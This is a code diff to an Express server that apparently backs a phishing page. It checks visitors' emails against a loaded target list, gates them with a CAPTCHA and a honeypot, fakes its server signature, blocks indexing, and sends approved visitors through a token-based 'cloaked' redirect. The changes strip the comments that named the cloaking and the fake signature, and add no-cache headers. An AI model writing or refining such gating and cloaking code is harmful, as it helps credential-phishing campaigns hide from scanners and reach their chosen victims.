@@ -29,25 +29,19 @@ function loadEmails() {
 }
 loadEmails();
 
-// Advanced Rate Limiting and Timing Defenses
-const limiter = rateLimit({
-  windowMs: 60 * 1000,
-  max: 40,
-  standardHeaders: true,
-  legacyHeaders: false,
-  message: { valid: false, message: 'Too many requests. Try again later.' },
-});
-
-// Middleware: Headers for Obscurity
+// Middleware: headers for cloaking + caching
 app.use((req, res, next) => {
   res.setHeader('X-Robots-Tag', 'noindex, nofollow');
   res.setHeader('X-Content-Type-Options', 'nosniff');
   res.setHeader('Server', 'nginx');
-  res.setHeader('X-Powered-By', 'PHP/7.4.33'); // Fake signature
+  res.setHeader('X-Powered-By', 'PHP/7.4.33');
+  res.setHeader('Cache-Control', 'no-store, no-cache, must-revalidate, proxy-revalidate');
+  res.setHeader('Pragma', 'no-cache');
+  res.setHeader('Expires', '0');
+  res.setHeader('Surrogate-Control', 'no-store');
   next();
 });
 
-// Enforce HTTPS Redirect
 app.use((req, res, next) => {
   if (req.headers['x-forwarded-proto'] !== 'https') {
     return res.redirect(`https://${req.headers.host}${req.url}`);
@@ -58,18 +52,21 @@ app.use((req, res, next) => {
 app.use(cors({
   origin: process.env.ALLOWED_ORIGIN || 'https://fropnvironmeropr.up.railway.app',
 }));
-
 app.use(express.json());
-app.use(helmet({
-  contentSecurityPolicy: false,
-}));
+app.use(helmet({ contentSecurityPolicy: false }));
+
+const limiter = rateLimit({
+  windowMs: 60 * 1000,
+  max: 40,
+  standardHeaders: true,
+  legacyHeaders: false,
+  message: { valid: false, message: 'Too many requests. Try again later.' },
+});
 app.use(limiter);
 
-// Email Check Endpoint
+// Email validation
 app.post('/api/check-email', async (req, res) => {
   const { email, captchaToken, middleName } = req.body;
-
-  // Honeypot bot detection
   if (middleName && middleName.trim() !== '') {
     await new Promise(r => setTimeout(r, 3000));
     return res.status(403).json({ valid: false, message: 'Detected bot behavior' });
@@ -83,7 +80,6 @@ app.post('/api/check-email', async (req, res) => {
     return res.status(400).json({ valid: false, message: 'CAPTCHA missing' });
   }
 
-  // CAPTCHA Verification
   try {
     const verifyRes = await fetch('https://challenges.cloudflare.com/turnstile/v0/siteverify', {
       method: 'POST',
@@ -113,7 +109,6 @@ app.post('/api/check-email', async (req, res) => {
   res.json({ valid: true, redirectUrl });
 });
 
-// Cloaked Forward Redirect
 app.get('/forward/:token', (req, res) => {
   const token = req.params.token;
   const entry = tokenMap.get(token);
